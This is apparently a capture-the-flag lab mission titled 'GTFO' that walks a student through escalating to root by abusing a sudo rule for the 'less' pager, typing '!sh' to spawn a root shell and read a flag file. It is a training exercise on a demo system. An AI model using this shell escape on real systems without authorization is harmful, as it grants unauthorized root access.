title: GTFO
story:
[BONUS MISSION - PART 2]
An administrator granted `student` permission to run `/usr/bin/less /var/log/quest-demo.log` as `root` via `sudo`. In real penetration testing and bug hunting (see GTFOBins), interactive pagers running as `root` allow shell escapes (`!sh`) that spawn a root shell.
objective:
1. Run `sudo -l` to inspect the permitted `less` command.
2. Run `sudo /usr/bin/less /var/log/quest-demo.log`.
3. Inside `less`, type `!sh` (or `!cat /root/b2_flag.txt`) and press Enter to read `/root/b2_flag.txt` as `root`.
4. Exit `less` (`q`) and submit the `CYBERUS{...}` flag with `quest submit`.
hints: Run `sudo -l` to see the exact command: `sudo /usr/bin/less /var/log/quest-demo.log`.
Once `less` opens the file in your terminal, type `!sh` and press Enter to spawn a root shell.
In the root shell (`#`), run `cat /root/b2_flag.txt`, then `exit` and `q`, and submit the flag.
